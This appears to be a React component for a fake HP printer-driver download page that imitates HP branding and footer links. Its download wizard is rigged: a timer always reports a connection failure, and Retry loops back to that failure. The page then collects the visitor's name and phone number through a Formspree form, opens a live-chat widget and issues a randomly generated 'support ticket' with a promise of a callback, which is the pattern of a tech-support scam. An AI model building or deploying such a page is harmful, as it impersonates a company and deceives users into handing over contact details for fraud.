import React, { useState, useCallback, useEffect } from 'react';
import { Download, X, ArrowRight } from 'lucide-react';
import { RotatingLines } from 'react-loader-spinner';
import { useForm, ValidationError } from '@formspree/react';

export default function HPLandingPage() {
    const [modelNumber, setModelNumber] = useState('');
    const [showModal, setShowModal] = useState(false);
    const [modalStep, setModalStep] = useState(1);
    const [connectionType, setConnectionType] = useState('');
    const [fullName, setFullName] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [supportTicket, setSupportTicket] = useState('');
    const [state, handleSubmit] = useForm("xqaylanz");

    useEffect(() => {
        if (modalStep === 5 || modalStep === 6) {
            // Check if script is already loaded
            const existingScript = document.getElementById('jivochat-script');
            if (!existingScript) {
                const script = document.createElement('script');
                script.id = 'jivochat-script';
                script.src = '//code.jivosite.com/widget/ZQnxf4SKf3';
                script.async = true;
                document.body.appendChild(script);
            }
        }
    }, [modalStep]);

    const openModal = useCallback(() => {
        setShowModal(true);
        setModalStep(1);
        setConnectionType('');
        setFullName('');
        setPhoneNumber('');
        setSupportTicket('');
    }, []);

    const closeModal = useCallback(() => {
        setShowModal(false);
        setModalStep(1);
        setModelNumber('');
        setConnectionType('');
        setFullName('');
        setPhoneNumber('');
        setSupportTicket('');
    }, []);

    const handleNextStep = useCallback(() => {
        setModalStep(prev => prev + 1);
    }, []);

    const handleConnectionSelect = useCallback((type) => {
        setConnectionType(type);
        setModalStep(4); // Go to loading step
        // After 6 seconds, show fail modal
        setTimeout(() => {
            setModalStep(5); // Go to fail modal
        }, 10000);
    }, []);

    const handleRetry = useCallback(() => {
        setModalStep(4); // Go back to loading
        // After 6 seconds, show fail modal again
        setTimeout(() => {
            setModalStep(5); // Go to fail modal
        }, 10000);
    }, []);

    const handleNeedAssistance = useCallback(() => {
        setModalStep(6); // Go to support form
    }, []);

    const handleSupportSubmit = async (e) => {
        e.preventDefault();
        if (fullName.trim() && phoneNumber.trim()) {
            await handleSubmit(e);
            if (!state.errors) {
                // Generate a random support ticket number
                const ticketNumber = 'TKT-' + Math.floor(100000 + Math.random() * 900000);
                setSupportTicket(ticketNumber);
            }
        }
    };

    const handleFormSubmit = useCallback(() => {
        if (modelNumber.trim()) {
            setModalStep(prev => prev + 1);
        }
    }, [modelNumber]);

    return (
        <div className="min-h-screen bg-white">
            {/* Header */}
            <header className="bg-white shadow-sm w-full sticky top-0 z-40">
                <div className="relative w-full px-4 sm:px-6 lg:px-12 py-3 sm:py-4 flex items-center">
                    {/* left section: logo + nav */}
                    <div className="flex items-center gap-4 sm:gap-8 w-full">
                        {/* logo */}
                        <img
                            src="/HP_logo.webp"
                            alt="Hawlett Print"
                            className="w-12 h-12 object-contain"
                            loading="eager"
                        />

                        {/* nav */}
                        <nav className="hidden md:flex absolute left-1/2 -translate-x-1/2 space-x-4 lg:space-x-8">
                            <a href="#" className="text-gray-700 hover:text-gray-900 font-medium text-xs lg:text-sm transition-colors">
                                Home
                            </a>
                            <a href="#" className="text-gray-700 hover:text-gray-900 font-medium text-xs lg:text-sm transition-colors">
                                OfficeJet
                            </a>
                            <a href="#" className="text-gray-700 hover:text-gray-900 font-medium text-xs lg:text-sm transition-colors">
                                InkJet
                            </a>
                            <a href="#" className="text-gray-700 hover:text-gray-900 font-medium text-xs lg:text-sm transition-colors">
                                LaserJet
                            </a>
                            <a href="#" className="text-gray-700 hover:text-gray-900 font-medium text-xs lg:text-sm transition-colors">
                                Envy
                            </a>
                        </nav>
                    </div>
                </div>
            </header>


            {/* Hero Section */}
            <section className="relative overflow-hidden bg-sky-800 text-white py-8 sm:py-12 lg:py-14 px-4 sm:px-6 lg:px-12 w-full">
                {/* background image layer */}
                <div
                    className="absolute inset-0 bg-cover bg-center opacity-20"
                    style={{ backgroundImage: "url('/hero-bg-image.jpg')" }}
                />

                {/* content */}
                <div className="relative z-10 w-full grid grid-cols-1 md:grid-cols-2 gap-6 sm:gap-8 items-center px-0 sm:px-4 lg:px-8">
                    {/* left content */}
                    <div className="text-center md:text-left">
                        <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold mb-4 sm:mb-5">
                            Download Free Printer Drivers
                        </h1>

                        <ul className="space-y-2 mb-5 sm:mb-6 text-xs sm:text-sm">
                            <li className="flex items-start justify-center md:justify-start">
                                <span className="mr-2">•</span>
                                <span>Make sure your printer is powered on</span>
                            </li>
                            <li className="flex items-start justify-center md:justify-start">
                                <span className="mr-2">•</span>
                                <span>Click on Download to install the drivers</span>
                            </li>
                        </ul>

                        <button
                            onClick={openModal}
                            className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-6 sm:px-8 py-2.5 sm:py-3 rounded-full flex items-center gap-2 transition-colors text-xs sm:text-sm mx-auto md:mx-0">
                            Download Now
                            <Download className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                        </button>
                    </div>

                    {/* right visual */}
                    <div className="relative hidden md:flex justify-end pr-20 lg:pr-40">
                        <img
                            src="/hp-printer.png"
                            alt="HP Printer"
                            className="w-48 lg:w-80 translate-x-8 lg:translate-x-16 drop-shadow-2xl"
                            loading="lazy"
                        />
                    </div>
                </div>
            </section>


            {/* Quick Download Section */}
            <section className="py-6 sm:py-8 lg:py-12 px-4 sm:px-6 lg:px-10 bg-gray-50">
                <div className="w-full max-w-7xl mx-auto">
                    <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-6 sm:mb-8 text-left"></h2>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 sm:gap-10 lg:gap-12">
                        {/* Form Section */}
                        <div>
                            <p className="text-gray-700 mb-4 sm:mb-6 text-xl font-semibold sm:text-xl">Quick Download Free Drivers</p>
                            <p className="text-gray-700 mb-4 sm:mb-6 text-xs sm:text-sm">Fill the form and download your printer driver</p>
                            <div className="mb-4">
                                <label className="block text-gray-700 font-semibold mb-2 text-xs sm:text-sm">Model Number:</label>
                                <input
                                    type="text"
                                    value={modelNumber}
                                    onChange={(e) => setModelNumber(e.target.value)}
                                    className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500 text-xs sm:text-sm"
                                    placeholder="Enter model number"
                                />
                            </div>
                            <button
                                onClick={openModal}
                                className="w-full sm:w-auto bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-6 sm:px-8 py-2.5 sm:py-3 flex items-center justify-center gap-2 transition-colors text-xs sm:text-sm rounded-md">
                                Quick Download & Install Drivers!
                                <Download className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                            </button>
                        </div>

                        {/* Model Number Info Section */}
                        <div>
                            <h3 className="text-base sm:text-lg font-bold text-gray-900 mb-3 sm:mb-4">How to find printer model number?</h3>
                            <p className="text-gray-700 mb-4 sm:mb-6 text-xs sm:text-sm">The product name is on the front of your device.</p>
                            <div className="relative">
                                <img
                                    src="/code-image.png"
                                    alt="HP Printer Model Number Location"
                                    className="w-full rounded-lg"
                                    loading="lazy"
                                />
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* Footer */}
            <footer className="bg-black text-gray-400 py-8 sm:py-10 lg:py-12 px-4">
                <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-6 sm:gap-8 mb-6 sm:mb-8">
                        {/* About Us */}
                        <div>
                            <h4 className="text-white font-semibold mb-4 text-sm">About Us</h4>
                            <ul className="space-y-2 text-xs">
                                <li><a href="#" className="hover:text-white">Contact HP</a></li>
                                <li><a href="#" className="hover:text-white">Careers</a></li>
                                <li><a href="#" className="hover:text-white">Investor relations</a></li>
                                <li><a href="#" className="hover:text-white">Sustainable impact</a></li>
                                <li><a href="#" className="hover:text-white">Diversity, Equity and Inclusion</a></li>
                                <li><a href="#" className="hover:text-white">Press center</a></li>
                                <li><a href="#" className="hover:text-white">The Garage</a></li>
                                <li><a href="#" className="hover:text-white">HP Store Newsletter</a></li>
                            </ul>
                        </div>

                        {/* Ways to Buy */}
                        <div>
                            <h4 className="text-white font-semibold mb-4 text-sm">Ways to Buy</h4>
                            <ul className="space-y-2 text-xs">
                                <li><a href="#" className="hover:text-white">Shop online</a></li>
                                <li><a href="#" className="hover:text-white">Call an HP rep</a></li>
                                <li><a href="#" className="hover:text-white">Find a reseller</a></li>
                                <li><a href="#" className="hover:text-white">Enterprise store</a></li>
                                <li><a href="#" className="hover:text-white">Public sector purchasing</a></li>
                            </ul>
                        </div>

                        {/* Support */}
                        <div>
                            <h4 className="text-white font-semibold mb-4 text-sm">Support</h4>
                            <ul className="space-y-2 text-xs">
                                <li><a href="#" className="hover:text-white">Download drivers</a></li>
                                <li><a href="#" className="hover:text-white">Support & troubleshooting</a></li>
                                <li><a href="#" className="hover:text-white">Community</a></li>
                                <li><a href="#" className="hover:text-white">Register your product</a></li>
                                <li><a href="#" className="hover:text-white">Authorized service providers</a></li>
                                <li><a href="#" className="hover:text-white">Check repair status</a></li>
                                <li><a href="#" className="hover:text-white">Fraud alert</a></li>
                                <li><a href="#" className="hover:text-white">Security Center</a></li>
                            </ul>
                        </div>

                        {/* HP Partners */}
                        <div>
                            <h4 className="text-white font-semibold mb-4 text-sm">HP Partners</h4>
                            <ul className="space-y-2 text-xs">
                                <li><a href="#" className="hover:text-white">HP Amplify Partner Program</a></li>
                                <li><a href="#" className="hover:text-white">HP Partner Portal</a></li>
                                <li><a href="#" className="hover:text-white">Developers</a></li>
                            </ul>
                        </div>

                        {/* Stay Connected */}
                        <div className="col-span-2 sm:col-span-1">
                            <h4 className="text-white font-semibold mb-3 sm:mb-4 text-xs sm:text-sm">Stay connected</h4>
                            <div className="flex gap-2 sm:gap-3 flex-wrap">
                                <a href="#" className="w-7 h-7 sm:w-8 sm:h-8 bg-white hover:bg-gray-100 active:bg-gray-200 rounded flex items-center justify-center transition-colors">
                                    <span className="text-gray-900 text-xs sm:text-sm font-semibold">in</span>
                                </a>
                                <a href="#" className="w-7 h-7 sm:w-8 sm:h-8 bg-white hover:bg-gray-100 active:bg-gray-200 rounded flex items-center justify-center transition-colors">
                                    <span className="text-gray-900 text-xs sm:text-sm font-semibold">f</span>
                                </a>
                                <a href="#" className="w-7 h-7 sm:w-8 sm:h-8 bg-white hover:bg-gray-100 active:bg-gray-200 rounded flex items-center justify-center transition-colors">
                                    <span className="text-gray-900 text-xs sm:text-sm font-semibold">X</span>
                                </a>
                                <a href="#" className="w-7 h-7 sm:w-8 sm:h-8 bg-white hover:bg-gray-100 active:bg-gray-200 rounded flex items-center justify-center transition-colors">
                                    <span className="text-gray-900 text-xs sm:text-sm font-semibold">IG</span>
                                </a>
                                <a href="#" className="w-7 h-7 sm:w-8 sm:h-8 bg-white hover:bg-gray-100 active:bg-gray-200 rounded flex items-center justify-center transition-colors">
                                    <span className="text-gray-900 text-xs sm:text-sm font-semibold">YT</span>
                                </a>
                            </div>
                        </div>
                    </div>

                    {/* Bottom Links */}
                    <div className="border-t border-gray-800 pt-4 sm:pt-6">
                        <div className="flex flex-wrap gap-2 sm:gap-2 text-[10px] sm:text-xs">
                            <a href="#" className="hover:text-white">Recalls</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Product recycling</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Accessibility</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">CA Supply Chains Act</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Privacy</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Use of cookies</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Your privacy choices</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Terms of use</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Limited warranty statement</a>
                            <span>|</span>
                            <a href="#" className="hover:text-white">Terms & conditions of sales & service</a>
                        </div>
                    </div>
                </div>
            </footer>
            {/* Modal */}
            {showModal && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4">
                    {/* backdrop */}
                    <div
                        className="absolute inset-0 bg-black/40"
                        onClick={closeModal}
                    />
                    <div className="bg-white rounded-md max-w-lg w-full max-h-[90vh] sm:max-h-[85vh] overflow-y-auto relative shadow-2xl transform -translate-y-6">
                        {/* Modal Header */}
                        <div className="sticky top-0 bg-white border-b border-gray-200 px-4 sm:px-6 lg:px-8 py-3 sm:py-4 flex items-center justify-between rounded-t-2xl z-10">
                            <h2 className="text-lg sm:text-xl lg:text-2xl font-bold text-gray-900 pr-2">Quick Download Free Drivers</h2>
                            <button
                                onClick={closeModal}
                                className="text-gray-400 hover:text-gray-600 active:text-gray-800 transition-colors flex-shrink-0"
                            >
                                <X className="w-6 h-6 sm:w-7 sm:h-7 lg:w-8 lg:h-8" />
                            </button>
                        </div>

                        {/* Modal Content */}
                        <div className="px-4 sm:px-6 lg:px-8 pt-2 sm:pt-3 pb-6 sm:pb-16">
                            {/* Step 1: Start Printer Setup */}
                            {modalStep === 1 && (
                                <div className="text-center">
                                    <button
                                        onClick={handleNextStep}
                                        className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-6 sm:px-8 py-2.5 sm:py-3 rounded-full flex items-center gap-2 transition-colors mx-auto mb-4 sm:mb-6 text-sm sm:text-base"
                                    >
                                        Let's Start
                                        <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5" />
                                    </button>
                                    <h3 className="text-lg sm:text-xl font-semibold text-gray-900 mb-6 sm:mb-8">Start Printer Setup Wizard</h3>
                                    <div className="flex justify-center">
                                        <img
                                            src="/img-1.png"
                                            alt="Printer Setup"
                                            className="w-full sm:w-96 h-48 sm:h-64 object-contain"
                                            loading="lazy"
                                        />
                                    </div>
                                </div>
                            )}

                            {/* Step 2: Fill Form */}
                            {modalStep === 2 && (
                                <div>
                                    <div className="bg-gray-50 rounded-lg p-4 sm:p-6 lg:p-8 mb-4 sm:mb-6">
                                        <p className="text-sm sm:text-base lg:text-lg text-gray-700 mb-4 sm:mb-6 text-center">Fill the form and download your printer driver</p>
                                        <div className="mb-4 sm:mb-6">
                                            <label className="block text-gray-900 font-semibold mb-2 sm:mb-3 text-sm sm:text-base lg:text-lg">Model Number:</label>
                                            <input
                                                type="text"
                                                value={modelNumber}
                                                onChange={(e) => setModelNumber(e.target.value)}
                                                className="w-full px-3 sm:px-4 py-3 sm:py-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm sm:text-base lg:text-lg"
                                                placeholder="Enter model number"
                                            />
                                        </div>
                                        <button
                                            onClick={handleFormSubmit}
                                            disabled={!modelNumber.trim()}
                                            className="w-full bg-sky-500 hover:bg-sky-600 active:bg-sky-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold px-6 sm:px-8 py-3 sm:py-4 rounded-full flex items-center justify-center gap-2 transition-colors text-sm sm:text-base lg:text-lg"
                                        >
                                            Quick Download & Install Drivers!
                                            <Download className="w-4 h-4 sm:w-5 sm:h-5" />
                                        </button>
                                    </div>
                                </div>
                            )}

                            {/* Step 3: Connection Type */}
                            {modalStep === 3 && (
                                <div>
                                    <h3 className="text-base sm:text-lg lg:text-xl text-gray-600 mb-3 sm:mb-4">Select Wi-Fi or USB connection?</h3>
                                    <div className="border-t border-gray-200 pt-3 sm:pt-4 space-y-3 sm:space-y-4">
                                        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 sm:gap-4 p-2 sm:p-3">
                                            <div className="flex flex-col items-center gap-3 sm:gap-4 lg:gap-6">
                                                <img
                                                    src="usb-detup.jpg"
                                                    alt="USB Connection"
                                                    className="w-24 h-12 sm:w-32 sm:h-14 lg:w-36 lg:h-16 object-contain"
                                                    loading="lazy"
                                                />
                                                <span className="text-xs sm:text-sm lg:text-base text-gray-700 font-medium text-center">USB: Connect via USB</span>
                                            </div>
                                            <button
                                                onClick={() => handleConnectionSelect('usb')}
                                                className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-5 sm:px-6 py-2.5 sm:py-3 rounded-full flex items-center gap-2 transition-colors text-sm sm:text-base w-full sm:w-auto justify-center"
                                            >
                                                Let's Start
                                                <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5" />
                                            </button>
                                        </div>

                                        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 sm:gap-4 p-2 sm:p-3">
                                            <div className="flex flex-col items-center gap-3 sm:gap-4 lg:gap-6">
                                                <img
                                                    src="wifi-setup.png"
                                                    alt="WiFi Connection"
                                                    className="w-24 h-12 sm:w-32 sm:h-14 lg:w-36 lg:h-16 object-contain"
                                                    loading="lazy"
                                                />
                                                <span className="text-xs sm:text-sm lg:text-base text-gray-700 font-medium text-center">WIFI: Connect via Wifi.</span>
                                            </div>
                                            <button
                                                onClick={() => handleConnectionSelect('wifi')}
                                                className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-5 sm:px-6 py-2.5 sm:py-3 rounded-full flex items-center gap-2 transition-colors text-sm sm:text-base w-full sm:w-auto justify-center"
                                            >
                                                Let's Start
                                                <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5" />
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Step 4: Loading */}
                            {modalStep === 4 && (
                                <div className="text-center pb-6 sm:pb-8">
                                    <p className="text-sm sm:text-base lg:text-lg text-gray-600 mb-4 sm:mb-6 px-2">Verify your printer's {connectionType === 'usb' ? 'USB' : 'WiFi'} connection for a seamless setup process.</p>
                                    <div className="border-t border-gray-200 pt-6 sm:pt-8">
                                        <p className="text-lg sm:text-xl text-gray-500 mb-6 sm:mb-8">Please wait...</p>
                                        <div className="flex justify-center mb-6 sm:mb-8">
                                            <img
                                                src="usb-detup.jpg"
                                                alt="Connecting"
                                                className="w-48 h-24 sm:w-56 sm:h-28 lg:w-64 lg:h-32 object-contain"
                                                loading="lazy"
                                            />
                                        </div>
                                        <div className="flex items-center justify-center gap-2 sm:gap-3 px-2">
                                            {/* ThreeDots Spinner */}
                                            <RotatingLines
                                                visible={true}
                                                height="30"
                                                width="30"
                                                color="#C0C0C0"
                                                radius="9"
                                                ariaLabel="three-dots-loading"
                                                wrapperStyle={{}}
                                                wrapperClass=""
                                            />

                                            <span className="text-sm sm:text-base lg:text-lg text-gray-500">
                                                Checking Printer Spooler...
                                            </span>
                                        </div>

                                    </div>
                                </div>
                            )}
                            {/* Step 5: Connection Failed */}
                            {modalStep === 5 && (
                                <div className="text-center pb-6 sm:pb-8">
                                    <p className="text-sm sm:text-base lg:text-lg text-gray-600 mb-4 sm:mb-6 px-2">Verify your printer's {connectionType === 'usb' ? 'USB' : 'WiFi'} connection for a seamless setup process.</p>
                                    <div className="border-t border-gray-200 pt-6 sm:pt-8">
                                        <div className="flex justify-center mb-6 sm:mb-8">
                                            <img
                                                src="usb-detup.jpg"
                                                alt="Connection Failed"
                                                className="w-12 h-12 sm:w-40 sm:h-20 lg:w-48 lg:h-24 object-contain"
                                                loading="lazy"
                                            />

                                        </div>
                                        <h3 className="text-lg sm:text-xl lg:text-2xl font-semibold text-gray-900 mb-2 sm:mb-4 px-2">{connectionType === 'wifi' ? 'Wifi' : 'Wifi'} connection failed.</h3>
                                        <div className="rounded-lg p-4 sm:p-6 mb-3 sm:mb-4 space-y-2 sm:space-y-3">
                                            <p className="text-xs sm:text-sm lg:text-base text-gray-700">
                                                Check {connectionType === 'wifi' ? 'Wifi' : 'Wifi'} on both ends. <button onClick={handleRetry} className="text-sky-600 hover:text-sky-700 active:text-sky-800 underline font-medium">Retry</button>
                                            </p>
                                            <p className="text-xs sm:text-sm lg:text-base text-gray-700">
                                                Check {connectionType === 'wifi' ? 'Wifi' : 'Wifi'} drivers. <a href="#" className="text-sky-600 hover:text-sky-700 active:text-sky-800 underline font-medium">Check Drivers</a>
                                            </p>
                                        </div>
                                        <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 justify-center">
                                            <button
                                                onClick={handleRetry}
                                                className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-5 sm:px-6 py-2 sm:py-2 rounded-lg transition-colors text-sm sm:text-base w-full sm:w-auto"
                                            >
                                                Fix Issue
                                            </button>
                                            <button
                                                onClick={handleNeedAssistance}
                                                className="bg-sky-500 hover:bg-sky-600 active:bg-sky-700 text-white font-semibold px-5 sm:px-6 py-2 sm:py-2 rounded-lg transition-colors text-sm sm:text-base w-full sm:w-auto"
                                            >
                                                Need Assistance?
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Step 6: Support Form */}
                            {modalStep === 6 && (
                                <div className="pb-6 sm:pb-8">
                                    <p className="text-sm sm:text-base lg:text-lg text-gray-600 mb-4 sm:mb-6 px-2">Verify your printer's {connectionType === 'usb' ? 'USB' : 'WiFi'} connection for a seamless setup process.</p>
                                    <div className="border-t border-gray-200 pt-6 sm:pt-8">
                                        <div className="flex justify-center mb-4 sm:mb-6">
                                            <img
                                                src="usb-detup.jpg"
                                                alt="Support"
                                                className="w-36 h-18 sm:w-40 sm:h-20 lg:w-48 lg:h-24 object-contain"
                                                loading="lazy"
                                            />
                                        </div>

                                        {!supportTicket ? (
                                            <>
                                                <h3 className="text-lg sm:text-xl lg:text-2xl font-semibold text-sky-500 mb-6 sm:mb-8 text-center">Welcome to Printer Support</h3>

                                                <form onSubmit={handleSupportSubmit} className="space-y-4 sm:space-y-6">
                                                    <div>
                                                        <label htmlFor="model" className="block text-gray-900 font-semibold mb-2 text-sm sm:text-base">Model Number:</label>
                                                        <input
                                                            id="model"
                                                            type="text"
                                                            name="modelNumber"
                                                            value={modelNumber}
                                                            onChange={(e) => setModelNumber(e.target.value)}
                                                            className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm sm:text-base"
                                                            placeholder="Enter model number"
                                                        />
                                                        <ValidationError prefix="Model Number" field="modelNumber" errors={state.errors} />
                                                    </div>

                                                    <div className="relative">
                                                        <label htmlFor="fullName" className="block text-gray-900 font-semibold mb-2 text-sm sm:text-base">Full Name:</label>
                                                        <input
                                                            id="fullName"
                                                            type="text"
                                                            name="fullName"
                                                            value={fullName}
                                                            onChange={(e) => setFullName(e.target.value)}
                                                            required
                                                            className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm sm:text-base"
                                                            placeholder="Enter your full name"
                                                        />
                                                        <ValidationError prefix="Full Name" field="fullName" errors={state.errors} />
                                                    </div>

                                                    <div>
                                                        <label htmlFor="phone" className="block text-gray-900 font-semibold mb-2 text-sm sm:text-base">Phone Number:</label>
                                                        <input
                                                            id="phone"
                                                            type="tel"
                                                            name="phoneNumber"
                                                            value={phoneNumber}
                                                            onChange={(e) => setPhoneNumber(e.target.value)}
                                                            required
                                                            className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-sky-500 text-sm sm:text-base"
                                                            placeholder="Enter your phone number"
                                                        />
                                                        <ValidationError prefix="Phone Number" field="phoneNumber" errors={state.errors} />
                                                    </div>

                                                    <input type="hidden" name="connectionType" value={connectionType} />

                                                    <button
                                                        type="submit"
                                                        disabled={state.submitting || !fullName.trim() || !phoneNumber.trim()}
                                                        className="w-full bg-sky-500 hover:bg-sky-600 active:bg-sky-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold px-6 sm:px-8 py-3 sm:py-4 rounded-lg transition-colors text-sm sm:text-base"
                                                    >
                                                        {state.submitting ? 'Submitting...' : 'Submit'}
                                                    </button>
                                                </form>
                                            </>
                                        ) : (
                                            <div className="text-center space-y-4 sm:space-y-6">
                                                <h3 className="text-lg sm:text-xl lg:text-2xl font-semibold text-gray-900">Your Support Ticket No.:</h3>
                                                <p className="text-2xl sm:text-3xl font-bold text-sky-500">{supportTicket}</p>
                                                <p className="text-xs sm:text-sm lg:text-base text-gray-600 leading-relaxed px-2 sm:px-4">
                                                    We acknowledge the receipt of your query. Our dedicated support engineer will promptly reach out to you. Kindly take note of your assigned Support Ticket Number for reference.
                                                </p>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}

        </div>
    );
}